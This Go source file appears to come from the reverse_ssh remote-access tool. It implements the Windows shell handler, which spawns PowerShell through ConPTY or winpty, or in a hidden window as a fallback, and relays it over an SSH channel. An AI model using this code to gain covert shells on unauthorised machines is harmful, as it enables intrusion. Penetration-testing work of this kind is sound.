//go:build windows
// +build windows

package handlers

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"syscall"

	"github.com/ActiveState/termtest/conpty"
	"github.com/NHAS/reverse_ssh/internal"
	"github.com/NHAS/reverse_ssh/pkg/logger"
	"github.com/NHAS/reverse_ssh/pkg/winpty"
	"golang.org/x/crypto/ssh"
	"golang.org/x/sys/windows"
)

//The basic windows shell handler, as there arent any good golang libraries to work with windows conpty
func shell(user *internal.User, connection ssh.Channel, requests <-chan *ssh.Request, log logger.Logger) {

	if user.Pty == nil {
		basicShell(connection, requests, log)
		return
	}

	vsn := windows.RtlGetVersion()
	if vsn.MajorVersion < 10 || vsn.BuildNumber < 17763 {

		log.Info("Windows version too old for Conpty (%d, %d), using basic shell", vsn.MajorVersion, vsn.BuildNumber)

		winpty, err := winpty.Open("powershell.exe", user.Pty.Columns, user.Pty.Rows)
		if err != nil {
			log.Info("Winpty failed. %s", err)
			basicShell(connection, requests, log)
			return
		}

		go func() {
			io.Copy(connection, winpty)
			connection.Close()
		}()

		io.Copy(winpty, connection)
		winpty.Close()
	} else {
		err := conptyShell(connection, requests, log, *user.Pty)
		if err != nil {
			log.Error("%v", err)
		}
	}

	connection.Close()

}

func conptyShell(connection ssh.Channel, reqs <-chan *ssh.Request, log logger.Logger, ptyReq internal.PtyReq) error {

	cpty, err := conpty.New(int16(ptyReq.Columns), int16(ptyReq.Rows))
	if err != nil {
		return fmt.Errorf("Could not open a conpty terminal: %v", err)
	}
	defer cpty.Close()

	// Spawn and catch new powershell process
	pid, _, err := cpty.Spawn(
		"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
		[]string{},
		&syscall.ProcAttr{
			Env: os.Environ(),
		},
	)
	if err != nil {
		return fmt.Errorf("Could not spawn a powershell: %v", err)
	}
	log.Info("New process with pid %d spawned", pid)
	process, err := os.FindProcess(pid)
	if err != nil {
		log.Fatal("Failed to find process: %v", err)
	}

	// Dynamically handle resizes of terminal window
	go func() {
		for req := range reqs {
			switch req.Type {

			case "window-change":
				w, h := internal.ParseDims(req.Payload)
				cpty.Resize(uint16(w), uint16(h))

			}

		}
	}()

	// Link data streams of ssh session and conpty
	go io.Copy(connection, cpty.OutPipe())
	go io.Copy(cpty.InPipe(), connection)

	_, err = process.Wait()
	if err != nil {
		return fmt.Errorf("Error waiting for process: %v", err)
	}

	return nil
}

func basicShell(connection ssh.Channel, reqs <-chan *ssh.Request, log logger.Logger) {

	cmd := exec.Command("powershell.exe", "-NoProfile", "-WindowStyle", "hidden", "-NoLogo")
	cmd.SysProcAttr = &syscall.SysProcAttr{

		CreationFlags: syscall.STARTF_USESTDHANDLES,
	}

	stdout, err := cmd.StdoutPipe()
	if err != nil {
		log.Error("%s", err)
		fmt.Fprint(connection, "Unable to open stdout pipe")

		return
	}

	cmd.Stderr = cmd.Stdout

	stdin, err := cmd.StdinPipe()
	if err != nil {
		log.Error("%s", err)
		fmt.Fprint(connection, "Unable to open stdin pipe")
		return
	}

	err = cmd.Start()
	if err != nil {
		log.Error("%s", err)
		fmt.Fprint(connection, "Could not start powershell")

	}

	go ssh.DiscardRequests(reqs)

	go func() {

		buf := make([]byte, 128)
		defer connection.Close()

		for {

			n, err := stdout.Read(buf)
			if err != nil {
				if err != io.EOF {
					log.Error("%s", err)
				}
				return
			}

			_, err = connection.Write(buf[:n])
			if err != nil {
				log.Error("%s", err)
				return
			}
		}
	}()

	go func() {
		buf := make([]byte, 128)
		defer connection.Close()

		for {
			n, err := connection.Read(buf)
			if err != nil {
				if err != io.EOF {
					log.Error("%s", err)
				}
				return
			}

			_, err = stdin.Write(buf[:n])
			if err != nil {
				if err != io.EOF {
					log.Error("%s", err)
				}
				return
			}

		}
	}()

	err = cmd.Wait()
	if err != nil {
		log.Error("%s", err)
	}

	connection.Close()
}
